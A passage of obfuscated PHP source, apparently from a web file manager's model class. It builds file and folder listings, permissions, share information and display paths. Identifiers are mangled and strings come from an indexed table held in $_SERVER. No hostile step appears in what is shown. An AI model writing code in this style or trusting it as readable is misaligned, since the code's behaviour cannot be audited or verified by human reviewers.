= $óŸ×îµ¹; } $this->alias($ô‡¸ÕòØ[446])->field($ç¨àÍÌ)->limit($ÓÏù¯¨‰)->order($·í’â›); $ä·¿Ëß„ = $this->join($´ù­ïî)->where($‚ƒø)->select(); if ($ä·¿Ëß„) { $Å§Ö°¾ı[$ô‡¸ÕòØ[369]] = $ä·¿Ëß„; } } protected function _makeOrder($é÷æÛ÷ = false) { $ª‘ªü =& $_SERVER[Ã¶¡¶„æ]; $™ŠàÆÏË = Model($ª‘ªü[447])->get($ª‘ªü[448]); $¿®øõä­ = Model($ª‘ªü[447])->get($ª‘ªü[449]); $ùâ÷Š¾§ = array($ª‘ªü[450] => $ª‘ªü[451], $ª‘ªü[452] => $ª‘ªü[453]); $€«í¤ßª = array($ª‘ªü[32] => $ª‘ªü[32], $ª‘ªü[76] => $ª‘ªü[76], $ª‘ªü[174] => $ª‘ªü[412], $ª‘ªü[454] => $ª‘ªü[454], $ª‘ªü[455] => $ª‘ªü[456], $ª‘ªü[200] => $ª‘ªü[200], $ª‘ªü[85] => $ª‘ªü[85]); $ãÔ¾´Ûì = Input::get($ª‘ªü[457], $ª‘ªü[7], $™ŠàÆÏË, array_keys($€«í¤ßª)); $òàÜ£à¸ = Input::get($ª‘ªü[458], $ª‘ªü[7], $¿®øõä­, array_keys($ùâ÷Š¾§)); if (!in_array($ãÔ¾´Ûì, array_keys($€«í¤ßª))) { $ãÔ¾´Ûì = $ª‘ªü[32]; } if (!in_array($òàÜ£à¸, array_keys($ùâ÷Š¾§))) { $ãÔ¾´Ûì = $ª‘ªü[450]; } if ($ãÔ¾´Ûì == $ª‘ªü[32]) { } $ÏÉ”‚†½ = $ª‘ªü[459] . $€«í¤ßª[$ãÔ¾´Ûì] . $ª‘ªü[53] . $ùâ÷Š¾§[$òàÜ£à¸]; $ÏÉ”‚†½ = rtrim(trim($ÏÉ”‚†½), $ª‘ªü[50]); if ($é÷æÛ÷) { return array($ÏÉ”‚†½, $ùâ÷Š¾§[$òàÜ£à¸]); } return $this->order($ÏÉ”‚†½); } protected function _listDataApplyItem($ÙÖºş, $ê¡Ğºíâ = false) { $ú²…ö±Ê = array($ÙÖºş); $this->_listDataApply($ú²…ö±Ê, $ê¡Ğºíâ); return $ú²…ö±Ê[0]; } protected function _listDataApply(&$±ïîş¸©, $ØÓ¢­é = false) { $ö­É¦ìß =& $_SERVER[Ã¶¡¶„æ]; if (!$±ïîş¸©) { $±ïîş¸© = array(); return; } $›¯ËÛ… = array_to_keyvalue($±ïîş¸©, $ö­É¦ìß[12], $ö­É¦ìß[402]); $›¯ËÛ… = array_unique($›¯ËÛ…); $this->_listSourceCache($±ïîş¸©); if (!$ØÓ¢­é) { $this->_listAppendMeta($±ïîş¸©, $›¯ËÛ…); $this->_listAppendFileMeta($±ïîş¸©, $›¯ËÛ…); $this->_listAppendChildren($±ïîş¸©, $›¯ËÛ…); } $this->_listAppendPath($±ïîş¸©); $this->_listAppendAuth($±ïîş¸©); $this->_listAppendSourceInfo($±ïîş¸©, $›¯ËÛ…); $this->_listAppendUser($±ïîş¸©); $this->_listFilterInfo($±ïîş¸©, $ØÓ¢­é); $this->_listAppendAuthSecret($±ïîş¸©); } protected function _listSourceCache($³È¨òÖ) { $¢íÔŸÆ =& $_SERVER[Ã¶¡¶„æ]; foreach ($³È¨òÖ as $æ’üé¨µ) { self::$cacheSourceInfo[$¢íÔŸÆ[460] . $æ’üé¨µ[$¢íÔŸÆ[402]]] = $æ’üé¨µ; } } protected function _listFilterInfo(&$šì–åœ, $İ¶â¯¡Š = false) { $ßéˆñ«ş =& $_SERVER[Ã¶¡¶„æ]; foreach ($šì–åœ as &$£„û¢Ä¦) { $£„û¢Ä¦ = $this->pathInfoFilter($£„û¢Ä¦); self::$cachePathInfo[$ßéˆñ«ş[461] . intval($İ¶â¯¡Š) . $ßéˆñ«ş[386] . $£„û¢Ä¦[$ßéˆñ«ş[402]]] = $£„û¢Ä¦; } unset($£„û¢Ä¦); } protected function _listMake(&$â•ïï•ı) { $şæ‡˜¬‚ =& $_SERVER[Ã¶¡¶„æ]; $â•ïï•ı[$şæ‡˜¬‚[82]] = array(); $â•ïï•ı[$şæ‡˜¬‚[83]] = array(); foreach ($â•ïï•ı[$şæ‡˜¬‚[369]] as $†ÊåŒÇ²) { $ÉÏÆğÎÒ = $†ÊåŒÇ²[$şæ‡˜¬‚[410]] == 1 ? $şæ‡˜¬‚[82] : $şæ‡˜¬‚[83]; $â•ïï•ı[$ÉÏÆğÎÒ][] = $†ÊåŒÇ²; } unset($â•ïï•ı[$şæ‡˜¬‚[369]]); } protected function _listAppendMeta(&$ùØ¢¹Ë‡, $¶›ã¿ùÙ) { $¯íÃù’ =& $_SERVER[Ã¶¡¶„æ]; $ËÁ¶Ôò™ = array($¯íÃù’[417] => array($¯íÃù’[418], $¶›ã¿ùÙ)); $¿Ùª­á¿ = Model($¯íÃù’[462])->field($¯íÃù’[463])->where($ËÁ¶Ôò™)->select(); if (!$¿Ùª­á¿) { return; } $½öÂ×å• = array($¯íÃù’[464], $¯íÃù’[465], $¯íÃù’[444]); $é¬íÈÃ = array(); foreach ($¿Ùª­á¿ as $ù»¾‚º) { if (!isset($é¬íÈÃ[$ù»¾‚º[$¯íÃù’[402]]])) { $é¬íÈÃ[$ù»¾‚º[$¯íÃù’[402]]] = array(); } if (in_array($ù»¾‚º[$¯íÃù’[94]], $½öÂ×å•)) { continue; } $é¬íÈÃ[$ù»¾‚º[$¯íÃù’[402]]][$ù»¾‚º[$¯íÃù’[94]]] = $ù»¾‚º[$¯íÃù’[374]]; } foreach ($ùØ¢¹Ë‡ as &$ÕÙ¿¶Ê”) { $ÕÙ¿¶Ê”[$¯íÃù’[466]] = !1; if (isset($é¬íÈÃ[$ÕÙ¿¶Ê”[$¯íÃù’[402]]])) { $ÕÙ¿¶Ê”[$¯íÃù’[466]] = $é¬íÈÃ[$ÕÙ¿¶Ê”[$¯íÃù’[402]]]; } if ($this->fileIsLock($ÕÙ¿¶Ê”) && $ÕÙ¿¶Ê”[$¯íÃù’[413]]) { $¢››è­ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÕÙ¿¶Ê”[$¯íÃù’[413]][$¯íÃù’[414]] = AuthModel::authDisable($ÕÙ¿¶Ê”[$¯íÃù’[413]][$¯íÃù’[414]], $¢››è­); $ÕÙ¿¶Ê”[$¯íÃù’[413]][$¯íÃù’[467]][$¯íÃù’[413]] = $ÕÙ¿¶Ê”[$¯íÃù’[413]][$¯íÃù’[414]]; } } unset($ÕÙ¿¶Ê”); } protected function _listAppendFileMeta(&$ıø¶³ÉÔ, $ã©¬Ôå) { $Âè“¤–… =& $_SERVER[Ã¶¡¶„æ]; $ÓÄ•ò€ = array_to_keyvalue($ıø¶³ÉÔ, $Âè“¤–…[12], $Âè“¤–…[468]); $ÓÄ•ò€ = array_filter(array_unique($ÓÄ•ò€)); if (!$ÓÄ•ò€) { return; } $‰Ä¶àªÆ = array($Âè“¤–…[469] => array($Âè“¤–…[418], $ÓÄ•ò€)); $õ×¹‚ş© = $Âè“¤–…[470]; $¾È…ıËÇ = Model($Âè“¤–…[471])->field($õ×¹‚ş©)->where($‰Ä¶àªÆ)->select(); $¾È…ıËÇ = array_to_keyvalue($¾È…ıËÇ, $Âè“¤–…[468]); $‘Ô“¾è = Model($Âè“¤–…[472])->field($Âè“¤–…[473])->where($‰Ä¶àªÆ)->select(); $‘Ô“¾è = $‘Ô“¾è ? $‘Ô“¾è : array(); $Â¾ÆÒØ“ = array(); foreach ($‘Ô“¾è as $ğÁ¡¿‹¯) { if (!isset($Â¾ÆÒØ“[$ğÁ¡¿‹¯[$Âè“¤–…[468]]])) { $Â¾ÆÒØ“[$ğÁ¡¿‹¯[$Âè“¤–…[468]]] = array(); } $Â¾ÆÒØ“[$ğÁ¡¿‹¯[$Âè“¤–…[468]]][$ğÁ¡¿‹¯[$Âè“¤–…[94]]] = $ğÁ¡¿‹¯[$Âè“¤–…[374]]; } foreach ($ıø¶³ÉÔ as &$½Àìéõı) { $şÄÈ¡ÖÍ = $½Àìéõı[$Âè“¤–…[468]]; if (!$şÄÈ¡ÖÍ || !is_array($¾È…ıËÇ[$şÄÈ¡ÖÍ])) { continue; } $°ğŞ‡âñ = $¾È…ıËÇ[$şÄÈ¡ÖÍ]; $°ğŞ‡âñ[$Âè“¤–…[76]] = $½Àìéõı[$Âè“¤–…[76]]; $°ğŞ‡âñ[$Âè“¤–…[32]] = $½Àìéõı[$Âè“¤–…[32]]; if (!isset(self::$cacheFileInfo[$Âè“¤–…[474] . $şÄÈ¡ÖÍ])) { self::$cacheFileInfo[$Âè“¤–…[474] . $şÄÈ¡ÖÍ] = array_merge(array(), $°ğŞ‡âñ); } unset($¾È…ıËÇ[$şÄÈ¡ÖÍ][$Âè“¤–…[84]]); $ºëßƒ–™ = is_array($Â¾ÆÒØ“[$şÄÈ¡ÖÍ]) ? $Â¾ÆÒØ“[$şÄÈ¡ÖÍ] : array(); $½Àìéõı[$Âè“¤–…[170]] = array_merge($ºëßƒ–™, $¾È…ıËÇ[$şÄÈ¡ÖÍ]); if (isset($½Àìéõı[$Âè“¤–…[170]][$Âè“¤–…[169]])) { $½Àìéõı[$Âè“¤–…[169]] = json_decode($½Àìéõı[$Âè“¤–…[170]][$Âè“¤–…[169]], !0); unset($½Àìéõı[$Âè“¤–…[170]][$Âè“¤–…[169]]); } } unset($½Àìéõı); } protected function _listAppendSourceInfo(&$µî§î, $Úµ‘Ñúš) { $ÈÙ¨šı¯ =& $_SERVER[Ã¶¡¶„æ]; if (!defined($ÈÙ¨šı¯[475])) { return; } $Î£™›“¡ = Model($ÈÙ¨šı¯[476])->listData(); $ÕÄ¾õ¥ë = Model($ÈÙ¨šı¯[425])->listData(); $Ø˜®ª± = Model($ÈÙ¨šı¯[415])->listData(); $ÂĞˆæô = Model($ÈÙ¨šı¯[477])->listSimple(); $²­ùùë² = array_to_keyvalue($Î£™›“¡, $ÈÙ¨šı¯[399]); $©‰¥¶¤ = array_to_keyvalue_group($ÕÄ¾õ¥ë, $ÈÙ¨šı¯[84], $ÈÙ¨šı¯[426]); $‘‹’Ø¦û = array_to_keyvalue($Ø˜®ª±, $ÈÙ¨šı¯[84]); $¬«—Çöê = array_to_keyvalue_group($ÂĞˆæô, $ÈÙ¨šı¯[402]); foreach ($µî§î as &$Çëò®Çş) { $Çëò®Çş[$ÈÙ¨šı¯[86]] = array($ÈÙ¨šı¯[478] => 0, $ÈÙ¨šı¯[479] => 0, $ÈÙ¨šı¯[480] => 0); if (isset($‘‹’Ø¦û[$Çëò®Çş[$ÈÙ¨šı¯[402]]])) { $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[481]] = 1; $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[482]] = $‘‹’Ø¦û[$Çëò®Çş[$ÈÙ¨šı¯[402]]][$ÈÙ¨šı¯[32]]; } if ($©‰¥¶¤ && $²­ùùë² && isset($©‰¥¶¤[$Çëò®Çş[$ÈÙ¨šı¯[402]]])) { $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[483]] = array(); foreach ($©‰¥¶¤[$Çëò®Çş[$ÈÙ¨šı¯[402]]] as $¦å²À¼) { $İ¦ÎåÎª = $²­ùùë²[$¦å²À¼]; $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[483]][] = array($ÈÙ¨šı¯[484] => $İ¦ÎåÎª[$ÈÙ¨šı¯[399]], $ÈÙ¨šı¯[420] => $İ¦ÎåÎª[$ÈÙ¨šı¯[32]], $ÈÙ¨šı¯[485] => $İ¦ÎåÎª[$ÈÙ¨šı¯[486]]); } } if ($¬«—Çöê && isset($¬«—Çöê[$Çëò®Çş[$ÈÙ¨šı¯[402]]])) { $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[487]] = array(); foreach ($¬«—Çöê[$Çëò®Çş[$ÈÙ¨šı¯[402]]] as $è­•÷“É) { $Çëò®Çş[$ÈÙ¨šı¯[86]][$ÈÙ¨šı¯[487]] = array($ÈÙ¨šı¯[488] => $è­•÷“É[$ÈÙ¨šı¯[489]], $ÈÙ¨šı¯[490] => $è­•÷“É[$ÈÙ¨šı¯[491]], $ÈÙ¨šı¯[492] => $è­•÷“É[$ÈÙ¨šı¯[402]], $ÈÙ¨šı¯[493] => $è­•÷“É[$ÈÙ¨šı¯[494]], $ÈÙ¨šı¯[495] => $è­•÷“É[$ÈÙ¨šı¯[496]], $ÈÙ¨šı¯[497] => $è­•÷“É[$ÈÙ¨šı¯[497]], $ÈÙ¨šı¯[498] => $è­•÷“É[$ÈÙ¨šı¯[498]]); } } } unset($Çëò®Çş); return $µî§î; } protected function _listAppendChildren(&$¿›š¹öØ, $¸±”¥ù×) { $ç×¥ˆ“Ş =& $_SERVER[Ã¶¡¶„æ]; $ÊÜî‹™® = array(); $¹£ı§¾ = array($ç×¥ˆ“Ş[207] => 0, $ç×¥ˆ“Ş[208] => 0); foreach ($¿›š¹öØ as &$Å™ü¼) { if (!$Å™ü¼[$ç×¥ˆ“Ş[410]]) { continue; } $ÊÜî‹™®[] = $Å™ü¼[$ç×¥ˆ“Ş[402]]; } unset($Å™ü¼); if (!$ÊÜî‹™®) { return; } $ç›ï‘©ö = array($ç×¥ˆ“Ş[432] => array($ç×¥ˆ“Ş[7], $ÊÜî‹™®), $ç×¥ˆ“Ş[431] => 0); $êÑù¥§ = array($ç×¥ˆ“Ş[432], $ç×¥ˆ“Ş[410], $ç×¥ˆ“Ş[499] => $ç×¥ˆ“Ş[500]); $ƒæ¹çãÓ = $this->field($êÑù¥§)->where($ç›ï‘©ö)->group($ç×¥ˆ“Ş[501])->select(); $Ş©Ïêä“ = array(); foreach ($ƒæ¹çãÓ as $ÍÁÅ›ûƒ) { $’ÖÎñäâ = $ÍÁÅ›ûƒ[$ç×¥ˆ“Ş[432]]; $³¤£ş•« = $ÍÁÅ›ûƒ[$ç×¥ˆ“Ş[410]] == $ç×¥ˆ“Ş[88] ? $ç×¥ˆ“Ş[208] : $ç×¥ˆ“Ş[207]; if (!isset($Ş©Ïêä“[$’ÖÎñäâ])) { $Ş©Ïêä“[$’ÖÎñäâ] = array($ç×¥ˆ“Ş[207] => 0, $ç×¥ˆ“Ş[208] => 0); } $Ş©Ïêä“[$’ÖÎñäâ][$³¤£ş•«] += $ÍÁÅ›ûƒ[$ç×¥ˆ“Ş[500]]; } foreach ($¿›š¹öØ as &$Å™ü¼) { if (!$Å™ü¼[$ç×¥ˆ“Ş[410]]) { continue; } $õùãÑÆÓ = is_array($Ş©Ïêä“[$Å™ü¼[$ç×¥ˆ“Ş[402]]]) ? $Ş©Ïêä“[$Å™ü¼[$ç×¥ˆ“Ş[402]]] : $¹£ı§¾; $Å™ü¼[$ç×¥ˆ“Ş[208]] = $õùãÑÆÓ[$ç×¥ˆ“Ş[208]]; $Å™ü¼[$ç×¥ˆ“Ş[207]] = $õùãÑÆÓ[$ç×¥ˆ“Ş[207]]; unset($Å™ü¼[$ç×¥ˆ“Ş[412]]); } unset($Å™ü¼); } protected function _listAppendAuth(&$Ú†‹å†ø) { $µËøÃ± =& $_SERVER[Ã¶¡¶„æ]; if (!defined($µËøÃ±[475])) { return; } $©ì¶È‘ = array(); foreach ($Ú†‹å†ø as $º••ô„Õ) { if ($º••ô„Õ[$µËøÃ±[411]] == self::TYPE_GROUP) { $©ì¶È‘[] = $º••ô„Õ[$µËøÃ±[402]]; } } if (!$©ì¶È‘) { return; } $ù€¤¿É = array_to_keyvalue($Ú†‹å†ø, $µËøÃ±[402]); $­´¼á®ã = Model($µËøÃ±[502])->getSourceList($©ì¶È‘, $ù€¤¿É); $ÑñôÔÓØ = $GLOBALS[$µËøÃ±[503]] == 1; foreach ($Ú†‹å†ø as $áĞÄá¢» => &$º••ô„Õ) { $º••ô„Õ[$µËøÃ±[413]] = $­´¼á®ã[$º••ô„Õ[$µËøÃ±[402]]]; if (!$º••ô„Õ[$µËøÃ±[413]] && $º••ô„Õ[$µËøÃ±[411]] == self::TYPE_GROUP) { $º••ô„Õ[$µËøÃ±[413]] = Action($µËøÃ±[504])->pathGroupAuthMake($º••ô„Õ[$µËøÃ±[505]]); if (!$º••ô„Õ[$µËøÃ±[413]] && !$ÑñôÔÓØ) { $º••ô„Õ[$µËøÃ±[202]] = !1; $º••ô„Õ[$µËøÃ±[201]] = !1; } } if ($º••ô„Õ[$µËøÃ±[413]]) { $º••ô„Õ[$µËøÃ±[202]] = AuthModel::authCheckEdit($º••ô„Õ[$µËøÃ±[413]][$µËøÃ±[414]]); $º••ô„Õ[$µËøÃ±[201]] = AuthModel::authCheckView($º••ô„Õ[$µËøÃ±[413]][$µËøÃ±[414]]); } $this->groupPathDisplay($º••ô„Õ); } unset($º••ô„Õ); } public function _listAppendAuthSecret(&$¨ƒÑ„ş) { $‰•ñ’Ì» =& $_SERVER[Ã¶¡¶„æ]; if (Model($‰•ñ’Ì»[435])->get($‰•ñ’Ì»[506]) != $‰•ñ’Ì»[88]) { return; } static $ÉÆè† = false; if (!$ÉÆè†) { $·à†¢‡î = Model($‰•ñ’Ì»[507]); $´œœæ‚÷ = Model($‰•ñ’Ì»[508]); $ÉÆè† = $´œœæ‚÷->listData(); $ÉÆè† = array_to_keyvalue($ÉÆè†, $‰•ñ’Ì»[402]); $èãòÑŞÛ = json_decode(Model($‰•ñ’Ì»[435])->get($‰•ñ’Ì»[509]), !0); $èãòÑŞÛ = array_to_keyvalue($èãòÑŞÛ, $‰•ñ’Ì»[399]); foreach ($ÉÆè† as $¾áÒäÚ => $ñ¶èÌşÇ) { $ç¬ØÓÉĞ = $èãòÑŞÛ[$ñ¶èÌşÇ[$‰•ñ’Ì»[510]]]; if (!$ç¬ØÓÉĞ) { $´œœæ‚÷->remove($ñ¶èÌşÇ[$‰•ñ’Ì»[399]]); unset($ÉÆè†[$¾áÒäÚ]); continue; } $éìí¯Èô = $·à†¢‡î->listData($ç¬ØÓÉĞ[$‰•ñ’Ì»[413]]); if (!$éìí¯Èô) { $´œœæ‚÷->remove($ñ¶èÌşÇ[$‰•ñ’Ì»[399]]); unset($ÉÆè†[$¾áÒäÚ]); continue; } $ñ¶èÌşÇ[$‰•ñ’Ì»[413]] = $éìí¯Èô; $ñ¶èÌşÇ[$‰•ñ’Ì»[511]] = $ç¬ØÓÉĞ; $ñ¶èÌşÇ[$‰•ñ’Ì»[512]] = Model($‰•ñ’Ì»[513])->getInfoSimpleOuter($ñ¶èÌşÇ[$‰•ñ’Ì»[454]]); $ÉÆè†[$¾áÒäÚ] = $ñ¶èÌşÇ; } } $Œª¿³‹ = defined($‰•ñ’Ì»[514]) ? USER_ID : $‰•ñ’Ì»[12]; $×šÎ„¦© = array(); $ØºÌ¤Ê = $this->_listAppendPath($×šÎ„¦©, !0); foreach ($¨ƒÑ„ş as $¾áÒäÚ => &$ñ¶èÌşÇ) { if (!is_array($ñ¶èÌşÇ[$‰•ñ’Ì»[413]])) { continue; } if ($ñ¶èÌşÇ[$‰•ñ’Ì»[411]] != $‰•ñ’Ì»[515]) { continue; } if (isset($ÉÆè†[$ñ¶èÌşÇ[$‰•ñ’Ì»[402]]])) { $ÜëĞ‚ = $ÉÆè†[$ñ¶èÌşÇ[$‰•ñ’Ì»[402]]]; if (!is_array($ñ¶èÌşÇ[$‰•ñ’Ì»[466]])) { $ñ¶èÌşÇ[$‰•ñ’Ì»[466]] = array(); } $ñ¶èÌşÇ[$‰•ñ’Ì»[466]][$‰•ñ’Ì»[516]] = $ÜëĞ‚[$‰•ñ’Ì»[510]]; $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[517]] = $ÜëĞ‚; $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[518]] = $ñ¶èÌşÇ[$‰•ñ’Ì»[519]]; $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[520]] = $‰•ñ’Ì»[88]; if ($ÜëĞ‚[$‰•ñ’Ì»[454]] != $Œª¿³‹) { $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[414]] = $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[414]] & $ÜëĞ‚[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[413]]; } continue; } $òùîâşƒ = $this->parentLevelArray($ñ¶èÌşÇ[$‰•ñ’Ì»[521]]); $í¨Ä¢ĞÇ = array_reverse($òùîâşƒ); foreach ($í¨Ä¢ĞÇ as $¼—”ğ => $à³©Ì©) { if (!isset($ÉÆè†[$à³©Ì©])) { continue; } $ÜëĞ‚ = $ÉÆè†[$à³©Ì©]; $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[517]] = $ÜëĞ‚; if ($ÜëĞ‚[$‰•ñ’Ì»[454]] != $Œª¿³‹) { $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[414]] = $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[414]] & $ÜëĞ‚[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[413]]; } $Â†‡ªş‘ = $‰•ñ’Ì»[12]; $»©÷Ñà§ = count($òùîâşƒ) - $¼—”ğ; for ($ğÏÍôù† = 0; $ğÏÍôù† < $»©÷Ñà§; $ğÏÍôù†++) { if (!isset($ØºÌ¤Ê[$òùîâşƒ[$ğÏÍôù†]])) { $Â†‡ªş‘ = $‰•ñ’Ì»[12]; break; } $Â†‡ªş‘ = $Â†‡ªş‘ . rtrim($ØºÌ¤Ê[$òùîâşƒ[$ğÏÍôù†]], $‰•ñ’Ì»[8]) . $‰•ñ’Ì»[8]; } $ñ¶èÌşÇ[$‰•ñ’Ì»[413]][$‰•ñ’Ì»[518]] = rtrim($Â†‡ªş‘, $‰•ñ’Ì»[8]) . $‰•ñ’Ì»[8]; break; } } unset($ñ¶èÌşÇ); } public function groupPathDisplay(&$ÃÈŒõ’½) { $üÍ·’­İ =& $_SERVER[Ã¶¡¶„æ]; if ($ÃÈŒõ’½[$üÍ·’­İ[411]] != self::TYPE_GROUP) { return; } $ÜÎèáÚÖ = Model($üÍ·’­İ[522])->getInfo($ÃÈŒõ’½[$üÍ·’­İ[505]]); $â¶¸ØÖà = $this->parentLevelArray($ÜÎèáÚÖ[$üÍ·’­İ[521]]); $œ¨˜ = $üÍ·’­İ[12]; foreach ($â¶¸ØÖà as $àÊ•Ö®) { $ìœ÷ªë‚ = Model($üÍ·’­İ[522])->getInfo($àÊ•Ö®); $œ¨˜ .= $ìœ÷ªë‚[$üÍ·’­İ[86]][$üÍ·’­İ[402]] . $üÍ·’­İ[50]; } $ÃÈŒõ’½[$üÍ·’­İ[523]] = $ÜÎèáÚÖ[$üÍ·’­İ[432]]; $ÃÈŒõ’½[$üÍ·’­İ[524]] = $ÜÎèáÚÖ[$üÍ·’­İ[521]]; $ÃÈŒõ’½[$üÍ·’­İ[525]] = $ÜÎèáÚÖ[$üÍ·’­İ[526]]; $ÃÈŒõ’½[$üÍ·’­İ[527]] = $œ¨˜ . $ÜÎèáÚÖ[$üÍ·’­İ[86]][$üÍ·’­İ[402]]; } protected function _listAppendPath(&$§å…“±ë, $¶Ùôîã = false) { $û£—ñôğ =& $_SERVER[Ã¶¡¶„æ]; static $Ïø½ñèç = array(); $´áüİê‡ = array(); $üì«ãÇå = array(); if ($¶Ùôîã) { return $Ïø½ñèç; } foreach ($§å…“±ë as &$ª¸ïŞ˜) { $ÈÍÏŒ©Ö = $ª¸ïŞ˜[$û£—ñôğ[402]]; if ($ª¸ïŞ˜[$û£—ñôğ[410]] == $û£—ñôğ[88] && $ª¸ïŞ˜[$û£—ñôğ[432]] != 0) { $Ïø½ñèç[$ÈÍÏŒ©Ö] = $ª¸ïŞ˜[$û£—ñôğ[32]]; } if ($ª¸ïŞ˜[$û£—ñôğ[410]] == $û£—ñôğ[88] && $ª¸ïŞ˜[$û£—ñôğ[432]] == 0 && !isset($Ïø½ñèç[$ÈÍÏŒ©Ö])) { $Ïø½ñèç[$ÈÍÏŒ©Ö] = $this->_listAppendPathRoot($ª¸ïŞ˜, array()); } if (isset($üì«ãÇå[$ª¸ïŞ˜[$û£—ñôğ[521]]])) { continue; } $üì«ãÇå[$ª¸ïŞ˜[$û£—ñôğ[521]]] = !0; $úú¤¯íè = $this->parentLevelArray($ª¸ïŞ˜[$û£—ñôğ[521]]); foreach ($úú¤¯íè as $ Ô“–â¡ => $Ôˆ–ùÓ) { if (isset($Ïø½ñèç[$Ôˆ–ùÓ])) { continue; } if ($ Ô“–â¡ == 0) { $Ïø½ñèç[$Ôˆ–ùÓ] = $this->_listAppendPathRoot($ª¸ïŞ˜, $úú¤¯íè); } if ($ Ô“–â¡ != 0) { $´áüİê‡[] = $Ôˆ–ùÓ; } } } unset($ª¸ïŞ˜); $´áüİê‡ = array_unique($´áüİê‡); if (count($´áüİê‡) > 0) { $šÖ”»¨« = array($û£—ñôğ[417] => array($û£—ñôğ[418], $´áüİê‡)); if (count($´áüİê‡) == 1) { $ƒÍ¢’Š³ = $this->sourceInfo($´áüİê‡[0]); $–µ’×¸¨ = is_array($ƒÍ¢’Š³) ? array($ƒÍ¢’Š³) : !1; } else { $–µ’×¸¨ = $this->field($û£—ñôğ[528])->where($šÖ”»¨«)->select(); } if (!$–µ’×¸¨) { $–µ’×¸¨ = array(); } foreach ($–µ’×¸¨ as $é ÀÛş‚) { $Ïø½ñèç[$é ÀÛş‚[$û£—ñôğ[402]]] = $é ÀÛş‚[$û£—ñôğ[32]]; } } $’ÂôÎ÷® = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $§®Ï ş— = array(); foreach ($§å…“±ë as &$ª¸ïŞ˜) { $µ´İ¼•¤ = $ª¸ïŞ˜[$û£—ñôğ[521]]; $Îó–ãˆ„ = $û£—ñôğ[12]; if (isset($§®Ï ş—[$µ´İ¼•¤])) { $Îó–ãˆ„ = $§®Ï ş—[$µ´İ¼•¤]; } else { $úú¤¯íè = $this->parentLevelArray($ª¸ïŞ˜[$û£—ñôğ[521]]); foreach ($úú¤¯íè as $ Ô“–â¡ => $Ôˆ–ùÓ) { if (isset($Ïø½ñèç[$Ôˆ–ùÓ])) { $Îó–ãˆ„ .= $Ïø½ñèç[$Ôˆ–ùÓ] . $û£—ñôğ[8]; } } $§®Ï ş—[$µ´İ¼•¤] = $Îó–ãˆ„; } $Îó–ãˆ„ .= $ª¸ïŞ˜[$û£—ñôğ[32]]; if ($ª¸ïŞ˜[$û£—ñôğ[410]] == $û£—ñôğ[88]) { $Îó–ãˆ„ .= $û£—ñôğ[8]; } $ª¸ïŞ˜[$û£—ñôğ[519]] = str_replace($û£—ñôğ[529], $û£—ñôğ[8], $Îó–ãˆ„); if ($ª¸ïŞ˜[$û£—ñôğ[432]] == $û£—ñôğ[197]) { $ª¸ïŞ˜[$û£—ñôğ[32]] = trim($Ïø½ñèç[$ª¸ïŞ˜[$û£—ñôğ[402]]], $û£—ñôğ[8]); $ª¸ïŞ˜[$û£—ñôğ[519]] = $ª¸ïŞ˜[$û£—ñôğ[32]] . $û£—ñôğ[8]; } if (intval($ª¸ïŞ˜[$û£—ñôğ[411]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ª¸ïŞ˜, $úú¤¯íè, $’ÂôÎ÷®); } } unset($ª¸ïŞ˜); return $§å…“±ë; } private function _listAppendPathRecycle(&$•÷µ°¤”, $¼ìÎÌ“ğ, $ğÅ—©É˜) { $¸Ãü» =& $_SERVER[Ã¶¡¶„æ]; if (!in_array($ğÅ—©É˜, $¼ìÎÌ“ğ) && $•÷µ°¤”[$¸Ãü»[402]] != $ğÅ—©É˜) { return; } $¤êëö»© = explode($¸Ãü»[8], trim($•÷µ°¤”[$¸Ãü»[519]], $¸Ãü»[8])); $Áä³ãÓÎ = implode($¸Ãü»[8], array_slice($¤êëö»©, 2)); $•÷µ°¤”[$¸Ãü»[519]] = $¸Ãü»[8] . LNG($¸Ãü»[530]) . $¸Ãü»[8] . ltrim($Áä³ãÓÎ, $¸Ãü»[8]); $•÷µ°¤”[$¸Ãü»[521]] = $¸Ãü»[531] . implode($¸Ãü»[50], array_slice($¼ìÎÌ“ğ, 1)) . $¸Ãü»[50]; if ($•÷µ°¤”[$¸Ãü»[402]] == $ğÅ—©É˜) { $•÷µ°¤”[$¸Ãü»[521]] = $¸Ãü»[531]; $•÷µ°¤”[$¸Ãü»[432]] = $¸Ãü»[197]; $•÷µ°¤”[$¸Ãü»[32]] = LNG($¸Ãü»[530]); } $•÷µ°¤”[$¸Ãü»[532]] = $¸Ãü»[533]; } protected function _listAppendPathRoot(&$™Ç¼×, $›à°İ˜Œ) { $”¶Ü’Ã… =& $_SERVER[Ã¶¡¶„æ]; static $ğñ°Å†ù = false; $Ü¼áÒı = $”¶Ü’Ã…[12]; if ($™Ç¼×[$”¶Ü’Ã…[411]] == self::TYPE_USER) { if (defined($”¶Ü’Ã…[475]) && $™Ç¼×[$”¶Ü’Ã…[505]] == USER_ID) { $Ü¼áÒı = LNG($”¶Ü’Ã…[534]); if ($ğñ°Å†ù === !1) { $È”„ˆ£Ñ = Model($”¶Ü’Ã…[535])->getInfoFull(USER_ID); $ğñ°Å†ù = _get($È”„ˆ£Ñ, $”¶Ü’Ã…[536], $”¶Ü’Ã…[12]); } if ($›à°İ˜Œ && $›à°İ˜Œ[0] == $ğñ°Å†ù || !$›à°İ˜Œ && $™Ç¼×[$”¶Ü’Ã…[402]] == $ğñ°Å†ù) { 